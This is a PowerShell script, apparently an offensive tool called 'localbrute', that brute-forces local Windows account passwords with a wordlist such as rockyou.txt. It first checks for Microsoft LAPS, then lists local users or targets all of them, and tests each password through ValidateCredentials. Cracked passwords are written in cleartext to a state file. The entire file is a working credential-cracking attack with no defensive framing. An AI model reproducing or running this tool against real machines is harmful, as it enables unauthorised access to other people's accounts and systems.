Function CheckLAPS {

    if ((Test-Path -Path 'C:\Program Files\LAPS\CSE\Admpwd.dll') -or
    (Test-Path -Path 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll') -or
    (Test-Path -Path 'C:\Program Files\LAPS\CSE\') -or
    (Test-Path -Path 'C:\Program Files (x86)\LAPS\CSE\')) {
        Write-Output "LAPS is active. Sorry."
        
        $continue = Read-Host "Do you want to continue anyway? (Type 'Y' for Yes or 'N' for No)"
        $continue = $continue.ToUpper()
        $Laps = $true
        if ($continue -ne 'Y') {
            exit
        }
    } else {
        "LAPS not detected ... ENJOY"
    }
}

Function Get-LocalUserList {
    # Retrieve the list of local users
    $localUsers = Get-LocalUser | Select-Object -ExpandProperty Name
    $localUsers += "ALL" # Add the "ALL" option

    # Display the interactive menu to choose a user
    Write-Host "Select a local user:"
    for ($i = 0; $i -lt $localUsers.Count; $i++) {
        Write-Host "$($i + 1) - $($localUsers[$i])"
    }

    # Get the user's choice
    do {
        $choice = Read-Host "Enter the number corresponding to the user (or type 'ALL' for all users):"
        if ([string]::IsNullOrWhiteSpace($choice)) {
            Write-Host "Invalid choice. Please choose a valid option or type 'ALL' for all users."
        }
    } while ([string]::IsNullOrWhiteSpace($choice))

    # Check if the choice is valid
    if ($choice -eq "ALL" -or ($choice -ge 1 -and $choice -le $localUsers.Count)) {
        if ($choice -eq "ALL") {
            $localUsers # Return all users if "ALL" is chosen
        } else {
            $localUsers[$choice - 1] # Return the chosen user
        }
    } else {
        Write-Host "Invalid choice. Please choose a valid option or type 'ALL' for all users."
        return $null
    }
}

Function localbrute {
    param($u, $dct, $debug)
    CheckLAPS

    # List of users with multiple choice including ALL
    $userChoice = Get-LocalUserList
    if ($userChoice -eq $null) {
        return
    }

    if ($userChoice -eq "ALL") {
        # Process all local users
        $localUsers = Get-LocalUser | Select-Object -ExpandProperty Name
    } else {
        $localUsers = $userChoice
    }

    foreach ($u in $localUsers) {
        # Your logic for brute-forcing for each user
        Write-Output "Bruteforcing for user: $u"

        $d = $dct -replace ".*\\" -replace ".*/"

        $index = (Get-Content .\localbrute.state | Where-Object { $_ -match "^${u}:${d}:" } | Select-Object -Last 1 -ErrorAction SilentlyContinue) -split ":" | Select-Object -Index 2
        if ($index) {
            Write-Output "Password for $u account already found: $index"
            return
        }

        $index = 0

        $dictionary = [System.IO.File]::ReadLines($dct)

        # Check if LAPS = true, if true then choose passwords of +14 characters
        if ($Laps) {
            $dictionary = $dictionary | Where-Object { $_.Length -ge 14 }
        }

        $dictionary | ForEach-Object -Begin { $i = 0 } -Process {
            $password = $_
            if ($i -ge $index) {
                if ($debug) {Write-Output "DEBUG: trying password for $u [${i}]: $password" }
                try {
                    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
                    $contextType = [DirectoryServices.AccountManagement.ContextType]::Machine
                    $principalContext = [DirectoryServices.AccountManagement.PrincipalContext]::new($contextType)
                    if ($principalContext.ValidateCredentials($u, $password)) {
                        Write-Output "${u}:${d}:True:${password}" >> localbrute.state
                        Write-Output "Password for $u account found: $password"
                        break
                    }
                } catch {

                }
            }
            $i++
        }

        Write-Output "${u}:${d}:${i}:${password}" >> localbrute.state
    }
}

# Example of calling localbrute function
localbrute -u "" -dct "rockyou.txt" -debug $true
